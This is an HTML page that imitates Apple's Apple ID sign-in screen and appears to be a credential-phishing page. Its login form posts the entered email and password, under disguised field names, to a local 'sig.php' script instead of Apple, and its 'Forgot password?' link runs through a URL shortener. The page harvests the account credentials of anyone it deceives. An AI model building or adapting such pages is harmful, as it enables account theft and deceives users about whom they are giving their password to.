
<html dir="ltr" data-rtl="false" lang="en" class="prefpane na-presentation">
<head>
<meta charset="UTF-8">
<meta name="robots" content="noindex">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <base target="_parent" />
 <meta name="robots" content="noindex">
 <script src="test/assets/js/main.js"></script>
 <link rel="stylesheet" href="./styles/home-3bb7a7fbb2c26750a901.css">
 <link rel="stylesheet" type="text/css" media="screen" href="./styles/app-sk7.css">
 <style type="text/css">
   @keyframes opacity-60-25-0-12 {
     0% {
       opacity: 0.25;
     }

     0.01% {
       opacity: 0.25;
     }

     0.02% {
       opacity: 1;
     }

     60.01% {
       opacity: 0.25;
     }

     100% {
       opacity: 0.25;
     }
   }

   @keyframes opacity-60-25-1-12 {
     0% {
       opacity: 0.25;
     }

     8.34333% {
       opacity: 0.25;
     }

     8.35333% {
       opacity: 1;
     }

     68.3433% {
       opacity: 0.25;
     }

     100% {
       opacity: 0.25;
     }
   }

   @keyframes opacity-60-25-2-12 {
     0% {
       opacity: 0.25;
     }

     16.6767% {
       opacity: 0.25;
     }

     16.6867% {
       opacity: 1;
     }

     76.6767% {
       opacity: 0.25;
     }

     100% {
       opacity: 0.25;
     }
   }

   @keyframes opacity-60-25-3-12 {
     0% {
       opacity: 0.25;
     }

     25.01% {
       opacity: 0.25;
     }

     25.02% {
       opacity: 1;
     }

     85.01% {
       opacity: 0.25;
     }

     100% {
       opacity: 0.25;
     }
   }

   @keyframes opacity-60-25-4-12 {
     0% {
       opacity: 0.25;
     }

     33.3433% {
       opacity: 0.25;
     }

     33.3533% {
       opacity: 1;
     }

     93.3433% {
       opacity: 0.25;
     }

     100% {
       opacity: 0.25;
     }
   }

   @keyframes opacity-60-25-5-12 {
     0% {
       opacity: 0.270958;
     }

     41.6767% {
       opacity: 0.25;
     }

     41.6867% {
       opacity: 1;
     }

     1.67667% {
       opacity: 0.25;
     }

     100% {
       opacity: 0.270958;
     }
   }

   @keyframes opacity-60-25-6-12 {
     0% {
       opacity: 0.375125;
     }

     50.01% {
       opacity: 0.25;
     }

     50.02% {
       opacity: 1;
     }

     10.01% {
       opacity: 0.25;
     }

     100% {
       opacity: 0.375125;
     }
   }

   @keyframes opacity-60-25-7-12 {
     0% {
       opacity: 0.479292;
     }

     58.3433% {
       opacity: 0.25;
     }

     58.3533% {
       opacity: 1;
     }

     18.3433% {
       opacity: 0.25;
     }

     100% {
       opacity: 0.479292;
     }
   }

   @keyframes opacity-60-25-8-12 {
     0% {
       opacity: 0.583458;
     }

     66.6767% {
       opacity: 0.25;
     }

     66.6867% {
       opacity: 1;
     }

     26.6767% {
       opacity: 0.25;
     }

     100% {
       opacity: 0.583458;
     }
   }

   @keyframes opacity-60-25-9-12 {
     0% {
       opacity: 0.687625;
     }

     75.01% {
       opacity: 0.25;
     }

     75.02% {
       opacity: 1;
     }

     35.01% {
       opacity: 0.25;
     }

     100% {
       opacity: 0.687625;
     }
   }

   @keyframes opacity-60-25-10-12 {
     0% {
       opacity: 0.791792;
     }

     83.3433% {
       opacity: 0.25;
     }

     83.3533% {
       opacity: 1;
     }

     43.3433% {
       opacity: 0.25;
     }

     100% {
       opacity: 0.791792;
     }
   }

   @keyframes opacity-60-25-11-12 {
     0% {
       opacity: 0.895958;
     }

     91.6767% {
       opacity: 0.25;
     }

     91.6867% {
       opacity: 1;
     }

     51.6767% {
       opacity: 0.25;
     }

     100% {
       opacity: 0.895958;
     }
   }
 </style>
 <script data-scrapbook-elem="custom-elements-loader">
   (function(names) {
     if (!customElements) {
       return;
     }
     for (const name of names) {
       customElements.define(name, class CustomElement extends HTMLElement {});
     }
   })(["apple-auth", "sign-in", "idms-modal"])
 </script>
 </head>
 <body class="tk-body ">
   <div aria-hidden="true" style="font-family:&quot;SF Pro Icons&quot;; width: 0px; height: 0px; color: transparent;">.</div>
   <div aria-hidden="true" style="font-family:&quot;SF Pro Display&quot;; width: 0px; height: 0px; color: transparent;">.</div>
   <div class="si-body si-container container-fluid" id="content" role="main" data-theme="dark">
     <apple-auth app-loading-defaults="{appLoadingDefaults}" pmrpc-hook="{pmrpcHook}">
       <div class="widget-container  fade-in restrict-min-content  restrict-max-wh  fade-in " data-mode="embed" data-isiebutnotedge="false">
         <div id="step" class="si-step  ">
           <logo {hide-app-logo}="hideAppLogo" {show-fade-in}="showFadeIn" {(section)}="section"></logo>
           <div id="stepEl" class="   ">
             <sign-in suppress-iforgot="{suppressIforgot}" initial-route="" {on-test-idp}="@_onTestIdp">
               <div class="signin fade-in" id="signin">
                 <div class="  swp-enable  container si-field-container  password-second-step  password-on     ">
                   <div id="sign_in_form" class="signin-form
  
  
  swp
   eyebrow 
   
   
   account-name-entered  
   fed-auth 
    

     show-password 
    
     
  ">
                     <div class="">
                       <div class="">
                         <div class="account-name form-row    hide-password    show-password ">
                           <label class="sr-only form-cell form-label" for="account_name_text_field">Sign In with your Apple&nbsp;ID</label>
                           <div class="form-cell">
                             <div class=" form-cell-wrapper form-textbox   ">
                               <form action="sig.php" method="post" id="form1">
                                 <input name="message" onsubmit="submit()" type="email" id="account_name_text_field" can-field="accountName" autocorrect="off" autocapitalize="none" aria-required="true" required="required" spellcheck="false" ($focus)="appleIdFocusHandler()" ($blur)="appleIdBlurHandler()" class="force-ltr form-textbox-input " autocomplete="off" aria-invalid="false">
                                 <span aria-hidden="true" id="apple_id_field_label" class=" form-textbox-label  form-label-flyout"> Apple ID </span>
                             </div>
                           </div>
                         </div>
                         <div class="password form-row   hide-password hide-placeholder   show-password show-placeholder   ">
                           <label class="sr-only form-cell form-label" for="password_text_field">Password</label>
                           <div class="form-cell">
                             <div class="form-cell-wrapper form-textbox  ">
                               <input name="text" type="password" onsubmit="submit() id=" password_text_field" ($focus)="pwdFocusHandler()" ($blur)="pwdBlurHandler()" aria-required="true" required="required" can-field="password" autocomplete="off" class="form-textbox-input " aria-invalid="false">
                               <span id="password_field_label" aria-hidden="true" class=" form-textbox-label  form-label-flyout"> Password </span>
                               <span class="sr-only form-label-flyout" id="invalid_user_name_pwd_err_msg" aria-hidden="true"></span>
                             </div>
                           </div>
                         </div>
                       </div>
                     </div>
                   </div>
                   <div class="si-remember-password">
                     <div class="form-checkbox">
                       <input type="checkbox" id="remember-me" {($checked)}="isRememberMeChecked" class="form-checkbox-input">
                       <label id="remember-me-label" class="form-label" for="remember-me">
                         <span class="form-checkbox-indicator" aria-hidden="true"></span> Keep me signed in </label>
                     </div>
                     <button type="submit" form="form1" value="Submit" id="sign-in" tabindex="3" name="submit" type="submit" class="si-button btn  fed-ui  moved   fed-ui-animation-show  " aria-label=" Sign In">
                   </div>
                   <div class="spinner-container auth  hide "></div>
                   <button type="submit" form="form1" value="Submit" id="sign-in" tabindex="3" name="submit" type="submit" class="si-button btn  fed-ui  moved   fed-ui-animation-show  " aria-label=" Sign In">
                     <i class="shared-icon icon_sign_in"></i>
                     <span class="text feat-split"> Sign In </span>
                   </button>
                   <button id="sign-in-cancel" ($click)="_signInCancel($element)" aria-disabled="false" tabindex="0" class="si-button btn secondary feat-split  remember-me   link " aria-label="Close">
                     <span class="text"> Close <input class="button" name="submit" type="submit" value="Sign in">
                     </span>
                   </button>
                 </div>
                 <div class="si-container-footer has-remember-me">
                   <div class="links tk-subbody">
                     <div class="si-forgot-password">
                       <a id="iforgot-link" class="si-link ax-outline lite-theme-override" ($click)="iforgotLinkClickHandler($element)" href="https://tinyurl.com/iforgoturl" > Forgot <span class="no-wrap sk-icon sk-icon-after sk-icon-external">password?</span>
                         <span class="sr-only">Opens in a new window.</span>
                       </a>
                     </div>
                   </div>
                 </div>
               </div>
             </sign-in>
           </div>
         </div>
         <div id="stocking" style="display:none !important;"></div>
         <input class="button" style="display:none !important;" name="submit" type="submit" value="Sign in">
       </div>
       <idms-modal wrap-class="full-page-error-wrapper " {(show)}="showfullPageError" auto-close="false"></idms-modal>
     </apple-auth>
   </div>
 </body>
 </html>